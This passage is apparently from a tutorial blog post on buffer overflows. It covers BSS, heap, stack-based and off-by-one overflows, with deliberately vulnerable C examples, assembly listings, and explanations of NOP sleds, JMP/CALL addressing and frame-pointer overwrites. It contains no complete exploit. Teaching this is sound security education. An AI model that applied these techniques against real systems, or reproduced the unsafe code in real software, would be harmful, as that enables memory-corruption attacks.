800w,/assets/img/2024-12-16-buffer-overflows/stack7-1400.webp 1400w," type="image/webp" sizes="95vw"></source> <img src="/assets/img/2024-12-16-buffer-overflows/stack7.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack8-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack8-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack8-1400.webp 1400w," type="image/webp" sizes="95vw"></source> <img src="/assets/img/2024-12-16-buffer-overflows/stack8.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack9-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack9-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack9-1400.webp 1400w," type="image/webp" sizes="95vw"></source> <img src="/assets/img/2024-12-16-buffer-overflows/stack9.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack10-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack10-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack10-1400.webp 1400w," type="image/webp" sizes="95vw"></source> <img src="/assets/img/2024-12-16-buffer-overflows/stack10.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack11-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack11-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack11-1400.webp 1400w," type="image/webp" sizes="95vw"></source> <img src="/assets/img/2024-12-16-buffer-overflows/stack11.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack12-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack12-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack12-1400.webp 1400w," type="image/webp" sizes="95vw"></source> <img src="/assets/img/2024-12-16-buffer-overflows/stack12.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack13-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack13-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack13-1400.webp 1400w," type="image/webp" sizes="95vw"></source> <img src="/assets/img/2024-12-16-buffer-overflows/stack13.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack14-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack14-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack14-1400.webp 1400w," type="image/webp" sizes="95vw"></source> <img src="/assets/img/2024-12-16-buffer-overflows/stack14.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack15-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack15-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack15-1400.webp 1400w," type="image/webp" sizes="95vw"></source> <img src="/assets/img/2024-12-16-buffer-overflows/stack15.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack16-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack16-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack16-1400.webp 1400w," type="image/webp" sizes="95vw"></source> <img src="/assets/img/2024-12-16-buffer-overflows/stack16.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack17-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack17-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack17-1400.webp 1400w," type="image/webp" sizes="95vw"></source> <img src="/assets/img/2024-12-16-buffer-overflows/stack17.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack18-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack18-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack18-1400.webp 1400w," type="image/webp" sizes="95vw"></source> <img src="/assets/img/2024-12-16-buffer-overflows/stack18.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack19-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack19-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack19-1400.webp 1400w," type="image/webp" sizes="95vw"></source> <img src="/assets/img/2024-12-16-buffer-overflows/stack19.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack20-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack20-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack20-1400.webp 1400w," type="image/webp" sizes="95vw"></source> <img src="/assets/img/2024-12-16-buffer-overflows/stack20.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack21-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack21-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack21-1400.webp 1400w," type="image/webp" sizes="95vw"></source> <img src="/assets/img/2024-12-16-buffer-overflows/stack21.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack22-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack22-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack22-1400.webp 1400w," type="image/webp" sizes="95vw"></source> <img src="/assets/img/2024-12-16-buffer-overflows/stack22.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </swiper-slide> </swiper-container> </div> <h1 id="buffer-overflows">Buffer Overflows</h1> <h2 id="classification">Classification</h2> <p>Broadly speaking, there are four generations of buffer overflows that can be used to compromise a system. This work focuses on classic stack-based overflows and off-by-one overflows, but for completeness, we will also briefly mention BSS overflows and heap overflows.</p> <h2 id="bss-overflows">BSS Overflows</h2> <p>As mentioned previously, uninitialized global and static variables are stored in the BSS segment. Unlike the stack, the BSS segment grows upward, meaning that a buffer overflow might overwrite higher memory addresses. Because the BSS segment does not store administrative information like return addresses (as the stack does), this type of vulnerability is more difficult for attackers to exploit.</p> <p>However, attackers can sometimes overwrite pointers in the BSS segment to redirect program flow (though this is relatively uncommon) or manipulate file pointers (which is somewhat more likely). Successfully manipulating a file pointer could, for instance, allow an attacker to alter system files (e.g., by modifying <code class="language-plaintext highlighter-rouge">/etc/passwd</code>).</p> <h2 id="heap-overflows">Heap Overflows</h2> <p>On the heap, functions such as <code class="language-plaintext highlighter-rouge">malloc()</code> can dynamically allocate memory at runtime. Like the BSS segment, the heap grows toward higher addresses. Along with the requested memory, certain administrative information about the allocated block is also stored on the heap. Because this administrative information is always placed directly adjacent to the allocated buffer, it can be overwritten during a heap overflow, often causing the program to crash.</p> <p>As with BSS overflows, manipulating program flow via heap overflows is challenging, but under certain conditions it is possible to overwrite any memory address in the process’s memory space (e.g., return addresses on the stack). Many operating systems prevent execution of code in the heap area.</p> <h2 id="classic-stack-based-buffer-overflows">Classic Stack-Based Buffer Overflows</h2> <p>Stack overflows are among the most frequently encountered buffer overflow vulnerabilities. As far back as 1996, Aleph One (alias Elias Levy) published an article titled <strong>“Smashing the Stack for Fun and Profit,”</strong> which examined this type of overflow in detail. Since both data and return addresses reside on the stack, stack overflows can present significant security risks. An attacker may be able to place executable code on the stack and then divert the program flow so that this malicious code is executed.</p> <p>The simplest way to exploit a stack overflow is to fill the vulnerable buffer with random data, forcing the program to crash. This kind of attack, known as a <strong>Denial of Service (DoS)</strong> attack, can be especially damaging for network services because it makes them unavailable. If the program generates a coredump on crashing, attackers may gain further insights that can aid in planning a more extensive attack. However, a DoS attack is often the least harmful method from the attacker’s perspective.</p> <p>More sophisticated attackers typically aim to hijack program flow and inject their own code, potentially granting them elevated privileges. This is especially straightforward with stack overflows, since the stack holds return addresses for all active functions. By overwriting these addresses, attackers can redirect execution. We will revisit the example from the previous section in a slightly modified form to demonstrate this.</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">foo</span><span class="p">(</span><span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="kt">int</span> <span class="n">y</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">char</span> <span class="n">buff2</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
	<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
	<span class="n">i</span> <span class="o">=</span> <span class="n">x</span> <span class="o">+</span> <span class="n">y</span><span class="p">;</span>
	<span class="n">strcpy</span><span class="p">(</span><span class="n">buff2</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
 	<span class="k">return</span> <span class="n">i</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">30</span><span class="p">];</span>
	<span class="n">foo</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="n">buff</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure> <p></p> <p>If the <code class="language-plaintext highlighter-rouge">buff2</code> buffer in the <code class="language-plaintext highlighter-rouge">foo()</code> function is not protected against overflow, the saved frame pointer (FP1) and then the return address (RIP) will be overwritten (see the previous figure). The attacker’s goal is to overwrite at least the higher addresses of the buffer—and beyond—with an address of their choosing.</p> <p>The fact that the saved frame pointer is also overwritten generally does not concern the attacker. Once the program flow is hijacked, the frame pointer is often no longer needed or will be set to a new value. In fact, there are procedures (detailed later) that allow direct access to payload data without relying on the frame pointer.</p> <p>In the simplest attack scenario, the attacker manipulates the return address to point to existing program code that is normally never executed. This might be interesting, for instance, in a program that only calls certain functions after a successful password check.</p> <p>A second approach is to place custom code directly into the overflowed buffer and have the return address point to it. A piece of malicious code that modifies program flow and executes injected code is generally called an <strong>exploit</strong>. Exploits consist of two parts:</p> <ol> <li> <strong>Injection Vector</strong> – Forces the buffer to overflow and branches execution to the payload.</li> <li> <strong>Payload</strong> – The malicious code itself, which can vary depending on the attacker’s goal. Typical payloads might open a shell (executing with the permissions of the vulnerable program), modify password files, release a virus, or install a network sniffer.</li> </ol> <p>Crafting a functional payload is often non-trivial. Because it must already be in machine code, the attacker needs knowledge of the target’s processor architecture and operating system to prepare code that will run successfully.</p> <h3 id="the-zero-byte-problem">The Zero Byte Problem</h3> <p>A common challenge arises because many string functions (particularly copy operations) terminate upon encountering a null byte. If the vulnerable program relies on such a string function, the payload must not contain a null byte (<code class="language-plaintext highlighter-rouge">\0</code>). Although the actual machine instructions typically do not include zero bytes, their operands often do. For instance, loading zero into a register might involve an instruction like:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">movl</span> <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span> <span class="o">%</span><span class="nb">ebx</span></code></pre></figure> <p>Because the operand is a literal, the null byte appears directly in the code. To ensure the exploit functions properly, direct usage of null literals should be avoided whenever possible; other instructions can be employed to set a register to zero. The next section outlines a method for circumventing these null bytes.</p> <h3 id="relative-addressing">Relative Addressing</h3> <p>The payload often contains data—such as strings—required during execution. Handling these data requires their absolute addresses. However, because the frame pointer is overwritten, relative addressing via the frame pointer is not an option. The attacker, not knowing the exact location of the data on the stack, must rely on a clever approach to determine absolute addresses. One possible payload structure that accomplishes this is discussed below:</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2018-02-05-buffer-overflows/relativeAddr-480.webp 480w,/assets/img/2018-02-05-buffer-overflows/relativeAddr-800.webp 800w,/assets/img/2018-02-05-buffer-overflows/relativeAddr-1400.webp 1400w," type="image/webp" sizes="95vw"></source> <img src="/assets/img/2018-02-05-buffer-overflows/relativeAddr.png" class="img-fluid rounded z-depth-1 imgcenter" width="400px" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> <figcaption class="caption"> <b>Figure 4:</b> Relative Adressing. </figcaption> </figure> <p>As shown in the figure, a <code class="language-plaintext highlighter-rouge">CALL</code> instruction is placed directly in front of the payload data, and a <code class="language-plaintext highlighter-rouge">JMP</code> instruction appears as the first statement in the code. When executed, the program flow first branches from the <code class="language-plaintext highlighter-rouge">JMP</code> to the <code class="language-plaintext highlighter-rouge">CALL</code>. This works because the <code class="language-plaintext highlighter-rouge">JMP</code> instruction can perform relative jumps. Once <code class="language-plaintext highlighter-rouge">CALL</code> is executed, the CPU automatically saves the return address (the location of the next instruction) onto the stack.</p> <p>In our case, there is no further instruction after the <code class="language-plaintext highlighter-rouge">CALL</code>—just data. Consequently, the <code class="language-plaintext highlighter-rouge">CALL</code> instruction writes the absolute address of the data area to the stack. In the next step, this address can be retrieved from the stack (using <code class="language-plaintext highlighter-rouge">POPL %ESI</code>) and then used freely by the exploit.</p> <hr> <h3 id="nop-sliding">NOP-Sliding</h3> <p>Overflow buffers are often significantly larger than the actual payload. Part of the buffer (the higher addresses) will be overwritten with the desired return address, while the remainder is available for the payload. To improve the odds of a successful attack, it’s essential to use this memory space strategically.</p> <p>However, there’s a catch: The attacker typically does not know the exact (absolute) address of the overflow buffer on the stack; only an estimate is possible. This estimate is usually fairly precise but not exact—most programs only place a few hundred or thousand bytes onto the stack. Achieving perfect precision is not feasible, and if the guessed address is off, the processor might jump into the middle of the payload or even land somewhere else entirely.</p> <p>To solve this, the leftover space in the overflow buffer can be filled with <strong>No Operation (NOP)</strong> instructions. The actual payload follows the NOP block. If the NOP block is large enough, a guessed return address has a comparatively high likelihood of landing somewhere in it. When the function eventually returns, execution starts somewhere within the NOP block, slides through the no-ops, and then proceeds to the actual payload code. This process is known as <strong>NOP-sliding</strong>.</p> <p>A typical exploit structure would look like this:</p> <ol> <li> <strong>NOP Sled</strong> (large block of no-ops)</li> <li> <strong>Payload</strong> (malicious code)</li> <li> <strong>Overwritten Return Address</strong> (pointing into the NOP sled)</li> </ol> <p>Upon function return, the instruction pointer hits the NOP block, seamlessly slides through the NOPs, and finally executes the payload.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2018-02-05-buffer-overflows/nop-sliding-480.webp 480w,/assets/img/2018-02-05-buffer-overflows/nop-sliding-800.webp 800w,/assets/img/2018-02-05-buffer-overflows/nop-sliding-1400.webp 1400w," type="image/webp" sizes="95vw"></source> <img src="/assets/img/2018-02-05-buffer-overflows/nop-sliding.png" class="img-fluid rounded z-depth-1 imgcenter" width="400px" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> <figcaption class="caption"> <b>Figure 5:</b> NOP sliding. </figcaption> </figure> <h2 id="off-by-one-and-frame-pointer-overwrites">Off-by-One and Frame Pointer Overwrites</h2> <p>Off-by-one overflows occur when a data buffer is overwritten by exactly one byte. The most common cause is an incorrectly specified loop termination condition. The following example illustrates this:</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="mi">1</span>	<span class="kt">void</span> <span class="nf">foo</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
<span class="mi">2</span>		<span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
<span class="mi">3</span>		<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
<span class="mi">4</span>		<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">100</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="c1">// Error: termination condition is off by one</span>
<span class="mi">5</span>			<span class="n">buff</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">str</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
<span class="mi">6</span>	<span class="p">}</span></code></pre></figure> <p>Here, the <code class="language-plaintext highlighter-rouge">for</code> loop iterates from 0 to 100, attempting to copy one extra element into <code class="language-plaintext highlighter-rouge">buff</code>. Since <code class="language-plaintext highlighter-rouge">buff</code> only has space for 100 bytes, the subsequent memory location is overwritten.</p> <p>In this particular example, <code class="language-plaintext highlighter-rouge">buff</code> is allocated on the stack because it is a local variable. Not all off-by-one errors necessarily involve stack arrays, but those that do can lead to frame pointer overwrites and other critical security risks.</p> <p>Now consider swapping lines 2 and 3. This change would cause the loop to overwrite the least significant byte (LSB) of <code class="language-plaintext highlighter-rouge">i</code>, due to the little-endian byte representation used by IA-32/x86 processors.</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="mi">1</span>	<span class="kt">void</span> <span class="nf">foo</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
<span class="mi">2</span>		<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
<span class="mi">3</span>		<span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
<span class="mi">4</span>		<span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;=</span><span class="mi">100</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="c1">// Here is an error!!!</span>
<span class="mi">5</span>			<span class="n">buff</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">str</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
<span class="mi">6</span>	<span class="p">}</span></code></pre></figure> <p></p> <p>In this example, if the least significant byte (LSB) of the loop counter <code class="language-plaintext highlighter-rouge">i</code> is overwritten with a value less than or equal to 100, an infinite loop could potentially occur. However, this particular bug does not allow the attacker to manipulate program flow. Such manipulation is only possible if the buffer is declared as the first statement of the function.</p> <p>When entering a function, the current frame pointer is saved on the stack, and space for local variables is then reserved. An off-by-one overflow would overwrite only the LSB of the saved frame pointer on the stack. Although this might not immediately disrupt the current function (since it’s not yet using the saved frame pointer), issues can arise once the function prepares to return. The <code class="language-plaintext highlighter-rouge">leave</code> instruction reloads the saved frame pointer into <code class="language-plaintext highlighter-rouge">EBP</code>, potentially causing problems in the calling function (for instance, because local variables there are accessed relative to <code class="language-plaintext highlighter-rouge">EBP</code>).</p> <p>To examine this more closely, we can extend the example with a <code class="language-plaintext highlighter-rouge">main()</code> function calling the flawed <code class="language-plaintext highlighter-rouge">foo()</code>:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">1</span>	<span class="nf">void</span> <span class="nv">main</span><span class="p">()</span> <span class="err">{</span>
<span class="err">2</span>		<span class="nf">char</span> <span class="nv">str</span><span class="p">[</span><span class="mi">101</span><span class="p">]</span><span class="c1">;</span>
<span class="err">3</span>		<span class="nf">foo</span><span class="p">(</span><span class="nv">str</span><span class="p">)</span><span class="c1">;</span>
<span class="err">4</span>	<span class="err">}</span>


<span class="err">1</span>	<span class="nl">main:</span>
<span class="err">2</span>        <span class="nf">pushl</span>   <span class="o">%</span><span class="nb">ebp</span>
<span class="err">3</span>        <span class="nf">movl</span>    <span class="o">%</span><span class="nb">esp</span><span class="p">,</span> <span class="o">%</span><span class="nb">ebp</span>
<span class="err">4</span>        <span class="nf">subl</span>    <span class="kc">$</span><span class="mi">120</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span>
<span class="err">5</span>        <span class="nf">subl</span>    <span class="kc">$</span><span class="mi">12</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span>
<span class="err">6</span>        <span class="nf">leal</span>    <span class="o">-</span><span class="mi">120</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span> <span class="o">%</span><span class="nb">eax</span>
<span class="err">7</span>        <span class="nf">pushl</span>   <span class="o">%</span><span class="nb">eax</span>
<span class="err">8</span>        <span class="nf">call</span>    <span class="nv">foo</span>
<span class="err">9</span>        <span class="nf">addl</span>    <span class="kc">$</span><span class="mi">16</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span>
<span class="err">10</span>       <span class="nf">leave</span>
<span class="err">11</span>       <span class="nf">ret</span></code></pre></figure> <p></p> <p>As mentioned earlier, after calling <code class="language-plaintext highlighter-rouge">foo()</code> (i.e., at line 9 in the assembly code), the <code class="language-plaintext highlighter-rouge">EBP</code> register (frame pointer) holds an incorrect value. Let’s analyze the <code class="language-plaintext highlighter-rouge">main()</code> function’s code starting from line 9:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">9</span>   <span class="nf">addl</span>    <span class="kc">$</span><span class="mi">16</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span></code></pre></figure> <p>After the function call, the stack pointer must be adjusted to remove the passed parameters. In this case, we only passed a single four-byte pointer. However, because line 5 reserved extra (unused) memory, the stack pointer is moved by a significantly larger offset.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">10</span>  <span class="nf">leave</span> </code></pre></figure> <p>The instruction in line 10 is logically equivalent to:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">movl</span> <span class="o">%</span><span class="nb">ebp</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span>
<span class="nf">popl</span> <span class="o">%</span><span class="nb">ebp</span></code></pre></figure> <p>At this point, the current frame pointer is copied into the stack pointer, and the previously saved frame pointer is popped into <code class="language-plaintext highlighter-rouge">EBP</code>. Normally, after <code class="language-plaintext highlighter-rouge">leave</code>, <code class="language-plaintext highlighter-rouge">ESP</code> would point to the return address of <code class="language-plaintext highlighter-rouge">main()</code>. However, due to the incorrect value in <code class="language-plaintext highlighter-rouge">EBP</code>, this is no longer the case in our example.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">11</span>  <span class="nf">ret</span></code></pre></figure> <p>Line 11 (<code class="language-plaintext highlighter-rouge">ret</code>) is effectively equivalent to:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">popl</span> <span class="o">%</span><span class="nv">eip</span></code></pre></figure> <p>Because the stack pointer does not point to the correct return address, <code class="language-plaintext highlighter-rouge">EIP</code> is loaded with an invalid address. The final <code class="language-plaintext highlighter-rouge">ret</code> instruction loads the return address into the instruction register. However, because the stack pointer no longer points to the correct return address, it loads a value that typically triggers an error and prematurely terminates the process.</p> <p><strong>Summary of the Example</strong><br> An off-by-one overflow in the <code class="language-plaintext highlighter-rouge">foo()</code> function overwrote the least significant byte of <code class="language-plaintext highlighter-rouge">main()</code>’s saved frame pointer. Consequently, when <code class="language-plaintext highlighter-rouge">foo()</code> exits, the corrupted value is loaded back into <code class="language-plaintext highlighter-rouge">EBP</code>, causing <code class="language-plaintext highlighter-rouge">ESP</code> in <code class="language-plaintext highlighter-rouge">main()</code> to shift incorrectly just before returning. As a result, the actual return address is not loaded into the instruction register, and the process terminates with an error since no valid instruction resides at the calculated address.</p> <p>Naturally, this raises the question: can we exploit the vulnerability so that the saved frame pointer is manipulated in such a way that a malicious program (injected earlier) executes upon exiting <code class="language-plaintext highlighter-rouge">main()</code>?</p> <p>Before delving into that possibility, let’s outline the stack structure for this example:</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2018-02-05-buffer-overflows/off-by-one1-480.webp 480w,/assets/img/2018-02-05-buffer-overflows/off-by-one1-800.webp 800w,/assets/img/2018-02-05-buffer-overflows/off-by-one1-1400.webp 1400w," type="image/webp" sizes="95vw"></source> <img src="/assets/img/2018-02-05-buffer-overflows/off-by-one1.png" class="img-fluid rounded z-depth-1 imgcenter" width="750px" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> <figcaption class="caption"> <b>Figure 6:</b> Off-by-One example. </figcaption> </figure> <p>As shown in the figure, it’s possible to manipulate the least significant byte (LSB) of the saved frame pointer (FP1). Ideally, you want FP1 to point into the memory area occupied by <code class="language-plaintext highlighter-rouge">buff</code>, where you could store a custom return address. Consequently, the LSB of FP1 should be as small as possible to increase the likelihood that FP1 eventually points where you want it.</p> <p>But what if the original value of FP1 is already quite small? In that scenario, even setting the LSB of FP1 to zero may not be enough to redirect it into the <code class="language-plaintext highlighter-rouge">buff</code> field. Additionally, in our example, the problem is compounded by the fact that the main function creates a relatively large array, making the distance between FP2 and FP1 quite large.</p> <p>If more than 247 bytes are placed on the stack in <code class="language-plaintext highlighter-rouge">main()</code>, it becomes impossible to manipulate FP1 in a way that it will point to <code class="language-plaintext highlighter-rouge">buff</code>. In this example, <code class="language-plaintext highlighter-rouge">main()</code> allocates 101 bytes for the <code class="language-plaintext highlighter-rouge">str</code> array, plus 4 bytes each for the return address (RIP) and the saved frame pointer (FP1). For a successful manipulation, the LSB of FP1 must be at least <code class="language-plaintext highlighter-rouge">146</code> (calculated as 255 - 101 - 4 - 4).</p> <p>In summary, the fewer bytes the calling function (<code class="language-plaintext highlighter-rouge">main()</code>) places on the stack—and the smaller the LSB of the saved frame pointer—the greater the chance of successfully manipulating the saved FP.</p> <p>Henceforth, we assume that the saved frame pointer can indeed be manipulated to point into <code class="language-plaintext highlighter-rouge">buff</code>. To execute a program successfully under these conditions, you should provide the following input to <code class="language-plaintext highlighter-rouge">foo()</code>, which gets copied into <code class="language-plaintext highlighter-rouge">buff</code> (see the blue-highlighted section in the figure):</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2018-02-05-buffer-overflows/off-by-one2-480.webp 480w,/assets/img/2018-02-05-buffer-overflows/off-by-one2-800.webp 800w,/assets/img/2018-02-05-buffer-overflows/off-by-one2-1400.webp 1400w," type="image/webp" sizes="95vw"></source> <img src="/assets/img/2018-02-05-buffer-overflows/off-by-one2.png" class="img-fluid rounded z-depth-1 imgcenter" width="750px" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> <figcaption class="caption"> <b>Figure 7:</b> Another off-by-one example. </figcaption> </figure> <p>The payload address is chosen so that it points to the NOPs region. By manipulating the least significant byte of the saved frame pointer (FP1), we expect FP1 to end up pointing to the payload address area. When <code class="language-plaintext highlighter-rouge">main()</code> exits, this address is then loaded into the instruction register, triggering the execution of the payload.</p> <h3 id="bug-of-the-gcc-compiler">Bug of the GCC compiler</h3> <p>Testing an exploit that was supposed to exploit this off-by-one vulnerability caused an unexpected problem that ultimately turned out to be a bug of the GNU compiler GCC 3.x. For clarification, the assembly code of the following function should be provided:</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="mi">1</span>	<span class="kt">void</span> <span class="nf">foo</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
<span class="mi">2</span>		<span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
